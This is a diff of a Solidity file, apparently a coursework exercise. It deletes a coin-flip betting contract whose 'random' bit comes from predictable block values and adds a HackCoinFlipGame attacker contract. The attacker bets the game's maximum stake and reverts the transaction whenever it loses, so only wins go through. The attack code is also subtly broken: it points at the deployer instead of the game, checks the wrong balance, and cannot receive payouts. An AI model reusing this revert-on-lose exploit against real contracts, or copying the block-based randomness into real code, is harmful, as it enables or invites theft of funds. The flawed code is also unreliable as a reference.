@@ -1,26 +1,34 @@
-pragma solidity ^0.5.9;
-contract CoinFlipGame {
+pragma solidity ^0.5.0;
+interface CoinFlipGameInterface {
+    function bet() external payable;
+    function maxBet() external view returns(uint256);
     
+}
+contract HackCoinFlipGame {
+    address owner;
+    CoinFlipGameInterface coinflipgame;
+    event LogWin(string);
     constructor() public payable {
+         owner = msg.sender;
+         coinflipgame = CoinFlipGameInterface(msg.sender);
     }
     
-    function bet() public payable {
-        require(msg.value <= maxBet(), "bet size too big");
-        
-        if (generateRandomBit()) {
-            msg.sender.transfer(msg.value * 2);
+    function hackCoinflipGame() public {
+        uint256 old_Balance = msg.sender.balance;
+        uint256 maxBet = coinflipgame.maxBet();
+        if (maxBet == 0)
+        {
+            return;
         }
+        coinflipgame.bet.value(maxBet)();
+        uint256 new_Balance = msg.sender.balance;
+        require(old_Balance < new_Balance, "Sorry you lose!");
+        emit LogWin("Great you hacked it!");
     }
     
-    function maxBet() public view returns(uint256) {
-        return address(this).balance / 10;
-    }
     
-    function generateRandomBit() private view returns(bool) {
-        // MODIFY ME to randomly return either true or false
-          if(uint256(keccak256(abi.encodePacked((block.timestamp + block.number) * block.gaslimit)))%block.difficulty == 0)
-         return true;
-         else
-         return false;
+    function balance () public view returns(uint256) {
+        return address(this).balance;
     }
+
 }
